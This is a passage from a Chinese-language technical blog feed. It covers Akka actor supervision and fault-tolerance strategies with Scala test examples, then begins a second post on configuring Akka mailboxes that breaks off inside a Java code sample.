将停止。<br>​</p><p>如果策略在监督者 Actor（而不是单独的类）中声明，则其决策者可以线程安全方式访问 Actor 的所有内部状态，包括获取对当前失败的子级的引用，可用作失败消息的getSender()。</p></li></ul></li><li><p>默认监督策略</p><p>   一般情况下使用默认的行为就可以了：如果 Actor 在运行中抛出异常，就重启 Actor；如果发生错误，就向上反映或是关闭应用程序。不过如果 Actor 在构造函数中抛出异常，那么会导致 ActorInitializationException，并最终导致 Actor 停止运行。如果没有为 Actor 定义监督策略，则默认情况下会处理以下异常：</p><ul><li>ActorInitializationException将停止失败的子 Actor</li><li>ActorKilledException将停止失败的子 Actor</li><li>DeathPactException将停止失败的子 Actor</li><li>Exception将重新启动失败的子 Actor</li><li>其他类型的Throwable将向上反映到父级 Actor</li><li>如果异常一直升级到根守护者，它将以与上面定义的默认策略相同的方式处理它。</li></ul></li><li><p>停止监督策略</p></li></ul><p>在子级失败时采取措施阻止他们，然后在DeathWatch显示子级死亡时由监督者采取纠正措施。此策略还预打包为SupervisorStrategy.stoppingStrategy，并附带一个StoppingSupervisorStrategy配置程序，以便在您希望/user下监护人应用它时使用。</p><ul><li><p>记录 Actor 的失败</p><p>   默认情况下，除非向上反映escalate，否则SupervisorStrategy会记录故障。escalate的故障应该在层次结构中更高的级别处理并记录下来。<br>   通过在实例化时将loggingEnabled设置为false，可以将SupervisorStrategy的默认日志设置为静音。定制的日志记录可以在Decider内完成。<br>   请注意，当在监督者 Actor 内部声明SupervisorStrategy时，对当前失败的子级的引用可用作sender。<br>你还可以通过重写logFailure方法自定义自己的SupervisorStrategy中的日志记录。</p></li></ul><h2 id="3-监管容错示例"><a href="#3-监管容错示例" class="headerlink" title="3.监管容错示例"></a>3.监管容错示例</h2><p>本示例主要演示Actor在发生错误时，它的监管者会根据相应的监管策略进行不同的处理。<a href="https://github.com/godpan/akka-demo/tree/master/Example_03">源码链接</a><br>因为这个例子比较简单，这里我直接贴上相应代码，后面根据具体的测试用例来解释各种监管策略所进行的响应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">class Supervisor extends Actor &#123;</span><br><span class="line">  //监管下属，根据下属抛出的异常进行相应的处理</span><br><span class="line">  override val supervisorStrategy =</span><br><span class="line">    OneForOneStrategy(maxNrOfRetries = 10, withinTimeRange = 1 minute) &#123;</span><br><span class="line">      case _: ArithmeticException =&gt; Resume</span><br><span class="line">      case _: NullPointerException =&gt; Restart</span><br><span class="line">      case _: IllegalArgumentException =&gt; Stop</span><br><span class="line">      case _: Exception =&gt; Escalate</span><br><span class="line">    &#125;</span><br><span class="line">  var childIndex = 0 //用于标示下属Actor的序号</span><br><span class="line"></span><br><span class="line">  def receive = &#123;</span><br><span class="line">    case p: Props =&gt;</span><br><span class="line">      childIndex += 1</span><br><span class="line">      //返回一个Child Actor的引用，所以Supervisor Actor是Child Actor的监管者</span><br><span class="line">      sender() ! context.actorOf(p,s&quot;child$&#123;childIndex&#125;&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Child extends Actor &#123;</span><br><span class="line">  val log = Logging(context.system, this)</span><br><span class="line">  var state = 0</span><br><span class="line">  def receive = &#123;</span><br><span class="line">    case ex: Exception =&gt; throw ex //抛出相应的异常</span><br><span class="line">    case x: Int =&gt; state = x //改变自身状态</span><br><span class="line">    case s: Command if s.content == &quot;get&quot; =&gt;</span><br><span class="line">      log.info(s&quot;the $&#123;s.self&#125; state is $&#123;state&#125;&quot;)</span><br><span class="line">      sender() ! state //返回自身状态</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case class Command(  //相应命令</span><br><span class="line">    content: String,</span><br><span class="line">    self: String</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>现在我们来看看具体的测试用例： 首先我们先构建一个测试环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class GuardianSpec(_system: ActorSystem)</span><br><span class="line">    extends TestKit(_system)</span><br><span class="line">    with WordSpecLike</span><br><span class="line">    with Matchers</span><br><span class="line">    with ImplicitSender &#123;</span><br><span class="line"></span><br><span class="line">  def this() = this(ActorSystem(&quot;GuardianSpec&quot;))</span><br><span class="line"></span><br><span class="line">  &quot;A supervisor&quot; must &#123;</span><br><span class="line"></span><br><span class="line">    &quot;apply the chosen strategy for its child&quot; in &#123;</span><br><span class="line">        code here...</span><br><span class="line">        val supervisor = system.actorOf(Props[Supervisor], &quot;supervisor&quot;) //创建一个监管者</span><br><span class="line">        supervisor ! Props[Child]</span><br><span class="line">        val child = expectMsgType[ActorRef] // 从 TestKit 的 testActor 中获取回应</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-TestOne：正常运行"><a href="#3-1-TestOne：正常运行" class="headerlink" title="3.1.TestOne：正常运行"></a>3.1.TestOne：正常运行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">child ! 50 // 将状态设为 50</span><br><span class="line">child ! Command(&quot;get&quot;,child.path.name)</span><br><span class="line">expectMsg(50)</span><br></pre></td></tr></table></figure><p>正常运行，测试通过。<br>​</p><h3 id="3-2-TestTwo：抛出ArithmeticException"><a href="#3-2-TestTwo：抛出ArithmeticException" class="headerlink" title="3.2.TestTwo：抛出ArithmeticException"></a>3.2.TestTwo：抛出ArithmeticException</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">child ! new ArithmeticException // crash it</span><br><span class="line">child ! Command(&quot;get&quot;,child.path.name)</span><br><span class="line">expectMsg(50)     </span><br></pre></td></tr></table></figure><p>大家猜这时候测试会通过吗？答案是通过，原因是根据我们制定的监管策略，监管者在面对子级Actor抛出ArithmeticException异常时，它会去恢复相应出异常的Actor，并保持该Actor的状态，所以此时Actor的状态值还是50，测试通过。<br>​</p><h3 id="3-3-TestThree：抛出NullPointerException"><a href="#3-3-TestThree：抛出NullPointerException" class="headerlink" title="3.3 TestThree：抛出NullPointerException"></a>3.3 TestThree：抛出NullPointerException</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">child ! new NullPointerException // crash it harder</span><br><span class="line">child ! &quot;get&quot;</span><br><span class="line">expectMsg(50)   </span><br></pre></td></tr></table></figure><p>这种情况下测试还会通过吗？答案是不通过，原因是根据我们制定的监管策略，监管者在面对子级Actor抛出NullPointerException异常时，它会去重启相应出异常的Actor，其状态会被清除，所以此时Actor的状态值应该是0，测试不通过。<br>​</p><h3 id="3-4-TestFour：抛出IllegalArgumentException"><a href="#3-4-TestFour：抛出IllegalArgumentException" class="headerlink" title="3.4.TestFour：抛出IllegalArgumentException"></a>3.4.TestFour：抛出IllegalArgumentException</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">supervisor ! Props[Child] // create new child</span><br><span class="line">val child2 = expectMsgType[ActorRef]</span><br><span class="line">child2 ! 100 // 将状态设为 100</span><br><span class="line">watch(child) // have testActor watch “child”</span><br><span class="line">child ! new IllegalArgumentException // break it</span><br><span class="line">expectMsgPF() &#123;</span><br><span class="line">  case Terminated(`child`) =&gt; (println(&quot;the child stop&quot;))</span><br><span class="line">&#125;</span><br><span class="line">child2 ! Command(&quot;get&quot;,child2.path.name)</span><br><span class="line">expectMsg(100)   </span><br></pre></td></tr></table></figure><p>这里首先我们又创建了一个Child Actor为child2，并将它的状态置为100，这里我们监控前面创建的child1，然后给其发送一个IllegalArgumentException的消息，让其抛出该异常，测试结果:<br><strong>​</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">the child stop </span><br><span class="line">测试通过</span><br></pre></td></tr></table></figure><p>​</p><p>从结果中我们可以看出，child在抛出IllegalArgumentException后，会被其监管着停止，但监管者下的其他Actor还是正常工作。</p><h3 id="3-5-TestFive：抛出一个自定义异常"><a href="#3-5-TestFive：抛出一个自定义异常" class="headerlink" title="3.5.TestFive：抛出一个自定义异常"></a>3.5.TestFive：抛出一个自定义异常</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> watch(child2)</span><br><span class="line"> child2 ! Command(&quot;get&quot;,child2.path.name) // verify it is alive</span><br><span class="line"> expectMsg(100)</span><br><span class="line"> supervisor ! Props[Child] // create new child</span><br><span class="line"> val child3 = expectMsgType[ActorRef]</span><br><span class="line"> child2 ! new Exception(&quot;CRASH&quot;) // escalate failure</span><br><span class="line"> expectMsgPF() &#123;</span><br><span class="line">    case t @ Terminated(`child2`) if t.existenceConfirmed =&gt; (</span><br><span class="line">       println(&quot;the child2 stop&quot;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">child3 ! Command(&quot;get&quot;,child3.path.name)</span><br><span class="line">expectMsg(0) </span><br></pre></td></tr></table></figure><p>这里首先我们又创建了一个Child Actor为child3,这里我们监控前面创建的child2,然后给其发送一个Exception(“CRASH”)的消息，让其抛出该异常,测试结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">the child2 stop </span><br><span class="line">测试不通过</span><br></pre></td></tr></table></figure><p>很多人可能会疑惑为什么TestFour可以通过，这里就通不过不了呢？因为这里错误Actor抛出的异常其监管者无法处理，只能将失败上溯传递，而顶级actor的缺省策略是对所有的Exception情况（ActorInitializationException和ActorKilledException例外）进行重启. 由于缺省的重启指令会停止所有的子actor，所以我们这里的child3也会被停止。导致测试不通过。当然这里你也可以复写默认的重启方法，比如：<br>​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override def preRestart(cause: Throwable, msg: Option[Any]) &#123;&#125;</span><br></pre></td></tr></table></figure><p>这样重启相应Actor时就不会停止其子级下的所有Actor了。<br>本文主要介绍了Actor系统中的监管和容错，这一部分内容在Akka中也是很重要的，它与Actor的树形组织结构巧妙结合，本文大量参考了Akka官方文档的相应章节，有兴趣的同学可以点击这里<a href="https://doc.akka.io/docs/akka/2.5/scala/fault-tolerance.html">Akka docs</a>。也可以下载我的示例程序，里面包含了一个官方的提供的容错示例。<br>​</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>​</p><p><a href="https://blog.csdn.net/lp284558195/article/details/112466024">https://blog.csdn.net/lp284558195/article/details/112466024</a><br><a href="https://blog.csdn.net/lp284558195/article/details/112466024">https://godpan.me/2017/04/15/learning-akka-3.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.概述&quot;&gt;&lt;/a&gt;1.概述&lt;/h2&gt;&lt;pre&gt;&lt;code&gt; Akka作为一种成熟的生产环境并发解决方案，必须拥有一套完善的错误异常处理机制，本文主要讲讲Akka中的监</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Mailboxes</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Mailboxes/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Mailboxes/</id>
    <published>2021-12-03T08:22:13.665Z</published>
    <updated>2021-12-03T09:07:15.151Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-依赖"><a href="#1-依赖" class="headerlink" title="1.依赖"></a>1.依赖</h1><p>为了使用邮箱（<code>Mailboxes</code>），你需要将以下依赖添加到你的项目中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Maven --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.typesafe.akka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>akka-actor_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Gradle --&gt;</span></span><br><span class="line">dependencies &#123;</span><br><span class="line">  compile group: &#x27;com.typesafe.akka&#x27;, name: &#x27;akka-actor_2.12&#x27;, version: &#x27;2.5.21&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- sbt --&gt;</span></span><br><span class="line">libraryDependencies += &quot;com.typesafe.akka&quot; %% &quot;akka-actor&quot; % &quot;2.5.21&quot;</span><br></pre></td></tr></table></figure><h2 id="2-简介"><a href="#2-简介" class="headerlink" title="2.简介"></a>2.简介</h2><p>Akka 的邮箱中保存着发给 Actor 的信息。通常，每个 Actor 都有自己的邮箱，但也有例外，如使用<code>BalancingPool</code>，则所有路由器（<code>routees</code>）将共享一个邮箱实例。</p><h2 id="3-邮箱选择"><a href="#3-邮箱选择" class="headerlink" title="3.邮箱选择"></a>3.邮箱选择</h2><h3 id="3-1-指定-Actor-的消息队列类型"><a href="#3-1-指定-Actor-的消息队列类型" class="headerlink" title="3.1 指定 Actor 的消息队列类型"></a>3.1 指定 Actor 的消息队列类型</h3><p>通过让某个 Actor 实现参数化接口<code>RequiresMessageQueue</code>，可以为某个 Actor 类型指定某种类型的消息队列。下面是一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> akka.dispatch.BoundedMessageQueueSemantics;</span><br><span class="line"><span class="keyword">import</span> akka.dispatch.RequiresMessageQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBoundedActor</span> <span class="keyword">extends</span> <span class="title">MyActor</span></span></span><br><span class="line"><span class="class">       <span class="keyword">implements</span> <span class="title">RequiresMessageQueue</span>&lt;<span class="title">BoundedMessageQueueSemantics</span>&gt; </span>&#123;&#125;</span><br></pre></td></tr></table></figure><p><code>RequiresMessageQueue</code>接口的类型参数需要映射到配置中的邮箱，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bounded-mailbox &#123;</span><br><span class="line">  mailbox-type = <span class="string">&quot;akka.dispatch.NonBlockingBoundedMailbox&quot;</span></span><br><span class="line">  mailbox-capacity = <span class="number">1000</span> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">akka.actor.mailbox.requirements &#123;</span><br><span class="line">  <span class="string">&quot;akka.dispatch.BoundedMessageQueueSemantics&quot;</span> = bounded-mailbox</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，每次创建<code>MyBoundedActor</code>类型的 Actor 时，它都会尝试获取一个有界邮箱。如果 Actor 在部署中配置了不同的邮箱，可以直接配置，也可以通过具有指定邮箱类型的调度器（<code>dispatcher</code>）配置，那么这将覆盖此映射。</p><ul><li><strong>注释</strong>：接口中的所需类型为 Actor 创建的邮箱中的队列类型，如果队列未实现所需类型，则 Actor 创建将失败。</li></ul><h3 id="3-2-指定调度器的消息队列类型"><a href="#3-2-指定调度器的消息队列类型" class="headerlink" title="3.2.指定调度器的消息队列类型"></a>3.2.指定调度器的消息队列类型</h3><p>调度器还可能需要运行在其上的 Actor 使用的邮箱类型。例如，<code>BalancingDispatcher</code>需要一个消息队列，该队列对于多个并发使用者是线程安全的。这需要对调度器进行配置，如下所示：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">my-dispatcher</span> &#123;</span><br><span class="line">  <span class="string">mailbox-requirement</span> <span class="string">=</span> <span class="string">org.example.MyInterface</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给定的需求命名一个类或接口，然后确保该类或接口是消息队列实现的父类型。如果发生冲突，例如，如果 Actor 需要不满足此要求的邮箱类型，则 Actor 创建将失败。</p><h3 id="3-3-如何选择邮箱类型"><a href="#3-3-如何选择邮箱类型" class="headerlink" title="3.3.如何选择邮箱类型"></a>3.3.如何选择邮箱类型</h3><p>创建 Actor 时，<code>ActorRefProvider</code>首先确定执行它的调度器。然后确定邮箱如下：</p><ol><li>如果 Actor 的部署配置节（<code>section</code>）包含<code>mailbox</code>键，那么它将命名一个描述要使用的邮箱类型的配置节。</li><li>如果 Actor 的<code>Props</code>包含邮箱选择（<code>mailbox selection</code>），即对其调用了<code>withMailbox</code>，则该属性将命名一个描述要使用的邮箱类型的配置节。请注意，这需要绝对配置路径，例如<code>myapp.special-mailbox</code>，并且不嵌套在<code>akka</code>命名空间中。</li><li>如果调度器的配置节包含<code>mailbox-type</code>键，则将使用相同的节来配置邮箱类型。</li><li>如果 Actor 需要如上所述的邮箱类型，则将使用该要求（<code>requirement</code>）的映射来确定要使用的邮箱类型；如果失败，则尝试使用调度器的要求（如果有）。</li><li>如果调度器需要如上所述的邮箱类型，那么将使用该要求的映射来确定要使用的邮箱类型。</li><li>将使用默认邮箱<code>akka.actor.default-mailbox</code>。<h3 id="3-4-默认邮箱"><a href="#3-4-默认邮箱" class="headerlink" title="3.4.默认邮箱"></a>3.4.默认邮箱</h3></li></ol><p>如果未按上述说明指定邮箱，则使用默认邮箱。默认情况下，它是一个无边界的邮箱，由<code>java.util.concurrent.ConcurrentLinkedQueue</code>支持。</p><p><code>SingleConsumerOnlyUnboundedMailbox</code>是一个效率更高的邮箱，它可以用作默认邮箱，但不能与<code>BalancingDispatcher</code>一起使用。</p><p>将<code>SingleConsumerOnlyUnboundedMailbox</code>配置为默认邮箱：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">akka.actor.default-mailbox</span> &#123;</span><br><span class="line">  <span class="string">mailbox-type</span> <span class="string">=</span> <span class="string">&quot;akka.dispatch.SingleConsumerOnlyUnboundedMailbox&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5-将哪个配置传递到邮箱类型"><a href="#3-5-将哪个配置传递到邮箱类型" class="headerlink" title="3.5.将哪个配置传递到邮箱类型"></a>3.5.将哪个配置传递到邮箱类型</h3><p>每个邮箱类型都由一个扩展<code>MailboxType</code>并接受两个构造函数参数的类实现：<code>ActorSystem.Settings</code>对象和<code>Config</code>部分。后者是通过从 Actor 系统的配置中获取命名的配置节、用邮箱类型的配置路径覆盖其<code>id</code>键并添加回退（<code>fall-back</code>）到默认邮箱配置节来计算的。</p><h2 id="4-内置邮箱实现"><a href="#4-内置邮箱实现" class="headerlink" title="4.内置邮箱实现"></a>4.内置邮箱实现</h2><p>Akka 附带了许多邮箱实现：</p><ul><li><code>UnboundedMailbox</code>（默认） <ul><li>默认邮箱</li><li>由<code>java.util.concurrent.ConcurrentLinkedQueue</code>支持</li><li>是否阻塞：<code>No</code></li><li>是否有界：<code>No</code></li><li>配置名称：<code>unbounded</code>或<code>akka.dispatch.UnboundedMailbox</code></li></ul></li><li><code>SingleConsumerOnlyUnboundedMailbox</code>，此队列可能比默认队列快，也可能不比默认队列快，具体取决于你的用例，请确保正确地进行基准测试！ <ul><li>由多个生产商单个使用者队列支持，不能与BalancingDispatcher一起使用</li><li>是否阻塞：<code>No</code></li><li>是否有界：<code>No</code></li><li>配置名称：<code>akka.dispatch.SingleConsumerOnlyUnboundedMailbox</code></li></ul></li><li><code>NonBlockingBoundedMailbox</code> <ul><li>由一个非常高效的”多生产者，单消费者“队列支持</li><li>是否阻塞：<code>No</code>（将溢出的消息丢弃为<code>deadLetters</code>）</li><li>是否有界：<code>Yes</code></li><li>配置名称：<code>akka.dispatch.NonBlockingBoundedMailbox</code></li></ul></li><li><code>UnboundedControlAwareMailbox</code> <ul><li>传递以更高优先级扩展<code>akka.dispatch.ControlMessage</code>的消息</li><li>由两个<code>java.util.concurrent.ConcurrentLinkedQueue</code>支持</li><li>是否阻塞：<code>No</code></li><li>是否有界：<code>No</code></li><li>配置名称：<code>akka.dispatch.UnboundedControlAwareMailbox</code></li></ul></li><li><code>UnboundedPriorityMailbox</code> <ul><li>由<code>java.util.concurrent.PriorityBlockingQueue</code>支持</li><li>等优先级邮件的传递顺序未定义，与<code>UnboundedStablePriorityMailbox</code>相反</li><li>是否阻塞：<code>No</code></li><li>是否有界：<code>No</code></li><li>配置名称：<code>akka.dispatch.UnboundedPriorityMailbox</code></li></ul></li><li><code>UnboundedStablePriorityMailbox</code><ul><li>由包装在<code>akka.util.PriorityQueueStabilizer</code>中的<code>java.util.concurrent.PriorityBlockingQueue</code>提供支持</li><li>对于优先级相同的消息保留<code>FIFO</code>顺序，与<code>UnboundedPriorityMailbox</code>相反</li><li>是否阻塞：<code>No</code></li><li>是否有界：<code>No</code></li><li>配置名称：<code>akka.dispatch.UnboundedStablePriorityMailbox</code></li></ul></li></ul><p>其他有界邮箱实现，如果达到容量并配置了非零<code>mailbox-push-timeout-time</code>超时时间，则会阻止发件人。特别地，以下邮箱只能与零<code>mailbox-push-timeout-time</code>一起使用。</p><ul><li><code>BoundedMailbox</code> <ul><li>由<code>java.util.concurrent.LinkedBlockingQueue</code>支持</li><li>是否阻塞：如果与非零<code>mailbox-push-timeout-time</code>一起使用，则为<code>Yes</code>，否则为<code>NO</code></li><li>是否有界：<code>Yes</code></li><li>配置名称：<code>bounded</code>或<code>akka.dispatch.BoundedMailbox</code></li></ul></li><li><code>BoundedPriorityMailbox</code> <ul><li>由包装在<code>akka.util.BoundedBlockingQueue</code>中的<code>java.util.PriorityQueue</code>提供支持</li><li>优先级相同的邮件的传递顺序未定义，与<code>BoundedStablePriorityMailbox</code>相反</li><li>是否阻塞：如果与非零<code>mailbox-push-timeout-time</code>一起使用，则为<code>Yes</code>，否则为<code>NO</code></li><li>是否有界：<code>Yes</code></li><li>配置名称：<code>akka.dispatch.BoundedPriorityMailbox</code></li></ul></li><li><code>BoundedStablePriorityMailbox</code> <ul><li>由包装在<code>akka.util.PriorityQueueStabilizer</code>和<code>akka.util.BoundedBlockingQueue</code>中的<code>java.util.PriorityQueue</code>提供支持</li><li>对于优先级相同的消息保留<code>FIFO</code>顺序，与<code>BoundedPriorityMailbox</code>相反</li><li>是否阻塞：如果与非零<code>mailbox-push-timeout-time</code>一起使用，则为<code>Yes</code>，否则为<code>NO</code></li><li>是否有界：<code>Yes</code></li><li>配置名称：<code>akka.dispatch.BoundedStablePriorityMailbox</code></li></ul></li><li><code>BoundedControlAwareMailbox</code> <ul><li>传递以更高优先级扩展<code>akka.dispatch.ControlMessage</code>的消息</li><li>由两个<code>java.util.concurrent.ConcurrentLinkedQueue</code>支持，如果达到容量，则在排队时阻塞</li><li>是否阻塞：如果与非零<code>mailbox-push-timeout-time</code>一起使用，则为<code>Yes</code>，否则为<code>NO</code></li><li>是否有界：<code>Yes</code></li><li>配置名称：<code>akka.dispatch.BoundedControlAwareMailbox</code></li></ul></li></ul><h2 id="5-邮箱配置示例"><a href="#5-邮箱配置示例" class="headerlink" title="5.邮箱配置示例"></a>5.邮箱配置示例</h2><h3 id="5-1-PriorityMailbox"><a href="#5-1-PriorityMailbox" class="headerlink" title="5.1.PriorityMailbox"></a>5.1.PriorityMailbox</h3><p>如何创建<code>PriorityMailbox</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyPrioMailbox</span> <span class="keyword">extends</span> <span class="title">UnboundedStablePriorityMailbox</span> </span>&#123;</span><br><span class="line">  <span class="comment">// needed for reflective instantiation</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">MyPrioMailbox</span><span class="params">(ActorSystem.Settings settings, Config config)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Create a new PriorityGenerator, lower prio means more important</span></span><br><span class="line">    <span class="keyword">super</span>(</span><br><span class="line">        <span class="keyword">new</span> PriorityGenerator() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">gen</span><span class="params">(Object message)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (message.equals(<span class="string">&quot;highpriority&quot;</span>))</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// &#x27;highpriority messages should be treated first if possible</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (message.equals(<span class="string">&quot;lowpriority&quot;</span>))</span><br><span class="line">              <span class="keyword">return</span> <span class="number">2</span>; <span class="comment">// &#x27;lowpriority messages should be treated last if possible</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (message.equals(PoisonPill.getInstance()))</span><br><span class="line">              <span class="keyword">return</span> <span class="number">3</span>; <span class="comment">// PoisonPill when no other left</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// By default they go between high and low prio</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将其添加到配置中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">prio-dispatcher &#123;</span><br><span class="line">  mailbox-type = <span class="string">&quot;docs.dispatcher.DispatcherDocSpec$MyPrioMailbox&quot;</span></span><br><span class="line">  <span class="comment">//Other dispatcher configuration goes here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是一个关于如何使用它的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 